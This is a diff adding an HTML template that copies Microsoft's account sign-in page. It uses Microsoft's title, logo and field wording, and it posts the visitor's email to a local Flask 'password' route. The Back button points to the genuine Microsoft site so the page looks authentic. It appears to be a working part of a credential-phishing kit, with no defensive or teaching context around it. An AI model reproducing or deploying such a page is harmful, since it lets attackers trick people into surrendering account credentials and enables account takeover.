@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="../static/css/styles.css">
+
+    <style>
+        form {
+          width:100%;
+          overflow:hidden;
+        }
+        form {
+          animation: slide-left 1s;
+        }
+        
+        @keyframes slide-left {
+          from {
+            margin-left: 100%;
+            width: 300%; 
+          }
+        
+          to {
+            margin-left: 0%;
+            width: 100%;
+          }
+        }
+        </style>
+</head>
+
+
+<body onload="script()">
+    <div class = 'wrapper'>
+    <div id="div1">
+        <img id="img1" src="/static/image/microsoftlogo.png" alt="pic">
+        <p id="p1">Sign in</p>
+
+        <form action="{{ url_for('password') }}" method="post" class = 'slide'>
+            <input name="email" class="no-outline" type="email"  placeholder="Email, phone, or Skype" required>
+            <hr>
+            <label id="label1" for="">No account?</label>
+            <a id="a1" href="#">Create one!</a><br><br>
+            <a id="a2" href="#">Can't access your account?</a>
+            <!-- <a id="a3" href="#"><img id="img2" src="/static/image/q4.png" alt=""></a><br><br> -->
+            <button id="back" value = 'Back', formaction="https://account.microsoft.com/account/Account?refp=signedout-index&refd=login.microsoftonline.com&ru=https%3A%2F%2Faccount.microsoft.com%2F%3Frefp%3Dsignedout-index%26refd%3Dlogin.microsoftonline.com&destrt=home.landing"> Back</button>
+            <button id="submit" name="submit", formaction="{{ url_for('password') }}"> Next</button>
+
+            
+            <!-- <button id="back" type="submit" name="submit"> Back</button> -->
+        </form>
+
+    </div>
+</body>
+</html>
